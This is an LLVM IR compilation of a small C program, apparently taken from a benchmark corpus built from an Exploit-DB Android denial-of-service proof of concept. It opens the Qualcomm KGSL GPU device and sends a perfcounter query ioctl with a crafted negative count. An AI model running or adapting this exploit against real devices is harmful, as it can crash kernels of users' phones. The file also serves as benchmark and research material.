; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/android/dos/extr_39504.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/android/dos/extr_39504.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.kgsl_perfcounter_query = type { i32, i32*, i32 }

@.str = private unnamed_addr constant [14 x i8] c"/dev/kgsl-3d0\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"open\00", align 1
@IOCTL_KGSL_PERFCOUNTER_QUERY = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.kgsl_perfcounter_query, align 8
  %4 = alloca [16 x i32], align 16
  store i32 0, i32* %1, align 4
  %5 = load i32, i32* @O_RDWR, align 4
  %6 = call i32 @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i32 %5)
  store i32 %6, i32* %2, align 4
  %7 = load i32, i32* %2, align 4
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %11

9:                                                ; preds = %0
  %10 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %22

11:                                               ; preds = %0
  %12 = call i32 @memset(%struct.kgsl_perfcounter_query* %3, i32 0, i32 24)
  %13 = getelementptr inbounds %struct.kgsl_perfcounter_query, %struct.kgsl_perfcounter_query* %3, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = bitcast [16 x i32]* %4 to i32*
  %15 = getelementptr inbounds %struct.kgsl_perfcounter_query, %struct.kgsl_perfcounter_query* %3, i32 0, i32 1
  store i32* %14, i32** %15, align 8
  %16 = getelementptr inbounds %struct.kgsl_perfcounter_query, %struct.kgsl_perfcounter_query* %3, i32 0, i32 2
  store i32 -2147483647, i32* %16, align 8
  %17 = load i32, i32* %2, align 4
  %18 = load i32, i32* @IOCTL_KGSL_PERFCOUNTER_QUERY, align 4
  %19 = call i32 @ioctl(i32 %17, i32 %18, %struct.kgsl_perfcounter_query* %3)
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  store i32 0, i32* %1, align 4
  br label %22

22:                                               ; preds = %11, %9
  %23 = load i32, i32* %1, align 4
  ret i32 %23
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(%struct.kgsl_perfcounter_query*, i32, i32) #1

declare dso_local i32 @ioctl(i32, i32, %struct.kgsl_perfcounter_query*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
